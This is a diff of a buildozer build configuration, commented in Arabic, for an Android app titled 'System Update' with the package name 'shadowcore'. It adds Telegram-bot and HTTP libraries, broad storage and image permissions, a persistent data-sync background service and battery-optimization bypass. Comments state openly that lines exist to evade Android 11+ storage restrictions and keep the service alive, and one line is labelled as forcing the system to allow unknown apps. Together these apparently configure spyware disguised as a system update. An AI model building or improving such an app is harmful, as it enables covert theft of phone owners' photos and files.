@@ -1,58 +1,62 @@
 [app]
-# (str) اسم التطبيق الذي سيظهر للمستخدم
+# (str) اسم التطبيق
 title = System Update
 
-# (str) اسم الحزمة (يجب أن يطابق الكود في main.py)
+# (str) اسم الحزمة (مطابق لملف main.py)
 package.name = shadowcore
 
 # (str) نطاق الحزمة
 package.domain = org.test
 
-# (str) مكان الكود المصدري
+# (str) مكان الكود
 source.dir = .
 
-# (list) الملفات المطلوب تضمينها
+# (list) الملفات المطلوبة
 source.include_exts = py,png,jpg,kv,atlas
 
-# (str) إصدار التطبيق
+# (str) الإصدار
 version = 1.0
 
-# (list) المكتبات المطلوبة (تم إضافة telebot و requests)
+# (list) المكتبات (تأكد من وجود pyTelegramBotAPI)
 requirements = python3,kivy,pyjnius,requests,pyTelegramBotAPI
 
-# (str) اتجاه الشاشة
+# (str) الاتجاه
 orientation = portrait
 
 # (bool) الشاشة الكاملة
 fullscreen = 0
 
-# (list) الأذونات (تم إضافة إذن مزامنة البيانات وتجاوز البطارية)
+# (list) الأذونات - تم إضافة إذن تجاهل البطارية وإذن المزامنة
 android.permissions = INTERNET, WAKE_LOCK, FOREGROUND_SERVICE, POST_NOTIFICATIONS, READ_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, FOREGROUND_SERVICE_DATA_SYNC, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
 
-# (int) API المستهدف (33 مثالي لأندرويد 13 و 14)
+# (int) API المستهدف (33 لأندرويد 13)
 android.api = 33
 
-# (int) أقل API يدعمه التطبيق
+# (int) أقل API
 android.minapi = 21
 
-# (list) المعماريات المدعومة
+# (list) المعماريات
 android.archs = arm64-v8a, armeabi-v7a
 
-# (list) الخدمات (ربط ملف service.py)
-# ملاحظة: حرف S الكبير في Service ضروري جداً
+# (list) الخدمات - الربط بملف service.py
 services = Service:service.py
 
-# (bool) إبقاء الشاشة مضيئة أثناء التحميل
-android.presplash_color = #000000
+# --- [أسطر تجاوز الأخطاء والقيود] ---
 
-# (list) ميزات Manifest الإضافية (تجاوز الخطأ في تشغيل الخدمة)
+# السماح بالوصول للملفات بنظام الأندرويد القديم (لتجاوز قيود أندرويد 11+)
 android.manifest.attributes = android:requestLegacyExternalStorage="true"
 
-# (str) تعريف نوع الخدمة في أندرويد 14
+# تحديد نوع الخدمة كـ "مزامنة بيانات" لضمان عدم إغلاقها في أندرويد 14
 android.service_type = dataSync
 
+# منع ظهور أخطاء الشاشة إذا تأخر تشغيل الخدمة
+android.presplash_color = #000000
+
+# إجبار النظام على السماح بالتطبيقات غير المعروفة من قبل الخدمة
+android.manifest.application_extra_xml = 
+
 [buildozer]
-# مستوى التسجيل (2 يعطي تفاصيل كاملة في حال وجود خطأ بالبناء)
+# مستوى التسجيل (debug)
 log_level = 2
 
 # التحذير عند التشغيل كجذر
